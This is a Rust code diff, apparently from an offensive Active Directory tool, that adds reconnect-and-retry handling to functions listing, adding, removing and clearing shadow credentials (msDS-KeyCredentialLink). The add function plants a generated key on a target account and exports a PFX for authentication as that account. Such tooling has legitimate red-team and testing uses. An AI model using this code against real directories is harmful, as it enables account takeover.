@@ -4,6 +4,8 @@ pub mod structures;
 
 use crate::commands::ldap_utils::{handle_modify_error, resolve_object_dn};
 use crate::help::add_terminal_spacing;
+use crate::ldap::LdapConfig;
+use crate::retry_with_reconnect;
 use ldap3::{LdapConn, Mod, Scope, SearchEntry};
 use rsa::traits::PublicKeyParts;
 use sha2::{Digest, Sha256};
@@ -15,17 +17,19 @@ const ATTR_NAME: &str = "msDS-KeyCredentialLink";
 pub fn list_shadow_credentials(
     ldap: &mut LdapConn,
     search_base: &str,
+    config: &mut LdapConfig,
     target: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     add_terminal_spacing(1);
 
-    let target_dn = resolve_object_dn(ldap, search_base, target)?;
+    let target_dn = resolve_object_dn(ldap, search_base, config, target)?;
     println!("[*] Target DN: {}", target_dn);
 
-    let (results, _) = ldap
-        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])?
-        .success()
-        .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;
+    let (results, _) = retry_with_reconnect!(ldap, config, {
+        ldap.search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])
+    })?
+    .success()
+    .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;
 
     if results.is_empty() {
         println!("[!] Target object not found");
@@ -103,6 +107,7 @@ pub fn list_shadow_credentials(
 pub fn add_shadow_credential(
     ldap: &mut LdapConn,
     search_base: &str,
+    config: &mut LdapConfig,
     target: &str,
     domain: &str,
     output_pfx: &str,
@@ -110,7 +115,7 @@ pub fn add_shadow_credential(
 ) -> Result<(), Box<dyn std::error::Error>> {
     add_terminal_spacing(1);
 
-    let target_dn = resolve_object_dn(ldap, search_base, target)?;
+    let target_dn = resolve_object_dn(ldap, search_base, config, target)?;
     println!("[*] Target DN: {}", target_dn);
 
     println!("[*] Generating RSA 2048 key pair...");
@@ -179,10 +184,11 @@ pub fn add_shadow_credential(
     // Encode as DN-Binary string
     let dn_binary_value = builder::encode_dn_binary(&blob, &target_dn);
 
-    let (results, _) = ldap
-        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])?
-        .success()
-        .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;
+    let (results, _) = retry_with_reconnect!(ldap, config, {
+        ldap.search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])
+    })?
+    .success()
+    .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;
 
     if results.is_empty() {
         return Err("Target object not found".into());
@@ -201,7 +207,9 @@ pub fn add_shadow_credential(
         value_set.insert(v.as_bytes().to_vec());
     }
 
-    match ldap.modify(&target_dn, vec![Mod::Replace(attr_bytes, value_set)]) {
+    match retry_with_reconnect!(ldap, config, {
+        ldap.modify(&target_dn, vec![Mod::Replace(attr_bytes.clone(), value_set.clone())])
+    }) {
         Ok(result) => match result.success() {
             Ok(_) => {
                 println!(
@@ -232,7 +240,7 @@ pub fn add_shadow_credential(
         }
     }
 
-    verify_credential(ldap, &target_dn, &hex::encode(key_id_hash));
+    verify_credential(ldap, config, &target_dn, &hex::encode(key_id_hash));
 
     println!("[*] Exporting PFX to {}...", output_pfx);
 
@@ -274,6 +282,7 @@ pub fn add_shadow_credential(
 pub fn remove_shadow_credential(
     ldap: &mut LdapConn,
     search_base: &str,
+    config: &mut LdapConfig,
     target: &str,
     device_id_str: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
@@ -282,13 +291,14 @@ pub fn remove_shadow_credential(
     let target_device_id =
         Uuid::parse_str(device_id_str).map_err(|e| format!("Invalid DeviceId UUID: {}", e))?;
 
-    let target_dn = resolve_object_dn(ldap, search_base, target)?;
+    let target_dn = resolve_object_dn(ldap, search_base, config, target)?;
     println!("[*] Target DN: {}", target_dn);
 
-    let (results, _) = ldap
-        .search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])?
-        .success()
-        .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;
+    let (results, _) = retry_with_reconnect!(ldap, config, {
+        ldap.search(&target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])
+    })?
+    .success()
+    .map_err(|e| format!("Failed to query {}: {}", ATTR_NAME, e))?;
 
     if results.is_empty() {
         return Err("Target object not found".into());
@@ -352,7 +362,9 @@ pub fn remove_shadow_credential(
 
     if remaining.is_empty() {
         let empty_set: HashSet<Vec<u8>> = HashSet::new();
-        match ldap.modify(&target_dn, vec![Mod::Delete(attr_bytes, empty_set)]) {
+        match retry_with_reconnect!(ldap, config, {
+            ldap.modify(&target_dn, vec![Mod::Delete(attr_bytes.clone(), empty_set.clone())])
+        }) {
             Ok(result) => match result.success() {
                 Ok(_) => {
                     println!(
@@ -383,7 +395,9 @@ pub fn remove_shadow_credential(
         for v in &remaining {
             value_set.insert(v.as_bytes().to_vec());
         }
-        match ldap.modify(&target_dn, vec![Mod::Replace(attr_bytes, value_set)]) {
+        match retry_with_reconnect!(ldap, config, {
+            ldap.modify(&target_dn, vec![Mod::Replace(attr_bytes.clone(), value_set.clone())])
+        }) {
             Ok(result) => match result.success() {
                 Ok(_) => {
                     println!(
@@ -417,17 +431,20 @@ pub fn remove_shadow_credential(
 pub fn clear_shadow_credentials(
     ldap: &mut LdapConn,
     search_base: &str,
+    config: &mut LdapConfig,
     target: &str,
 ) -> Result<(), Box<dyn std::error::Error>> {
     add_terminal_spacing(1);
 
-    let target_dn = resolve_object_dn(ldap, search_base, target)?;
+    let target_dn = resolve_object_dn(ldap, search_base, config, target)?;
     println!("[*] Target DN: {}", target_dn);
 
     let attr_bytes = ATTR_NAME.as_bytes().to_vec();
     let empty_set: HashSet<Vec<u8>> = HashSet::new();
 
-    match ldap.modify(&target_dn, vec![Mod::Delete(attr_bytes, empty_set)]) {
+    match retry_with_reconnect!(ldap, config, {
+        ldap.modify(&target_dn, vec![Mod::Delete(attr_bytes.clone(), empty_set.clone())])
+    }) {
         Ok(result) => match result.success() {
             Ok(_) => {
                 println!(
@@ -486,10 +503,17 @@ fn build_pfx(
     Ok(pfx_bytes)
 }
 
-fn verify_credential(ldap: &mut LdapConn, target_dn: &str, expected_key_id: &str) {
+fn verify_credential(
+    ldap: &mut LdapConn,
+    config: &mut LdapConfig,
+    target_dn: &str,
+    expected_key_id: &str,
+) {
     println!("[*] Verifying credential in AD...");
 
-    let search = ldap.search(target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME]);
+    let search = retry_with_reconnect!(ldap, config, {
+        ldap.search(target_dn, Scope::Base, "(objectClass=*)", vec![ATTR_NAME])
+    });
 
     let (results, _) = match search {
         Ok(r) => match r.success() {
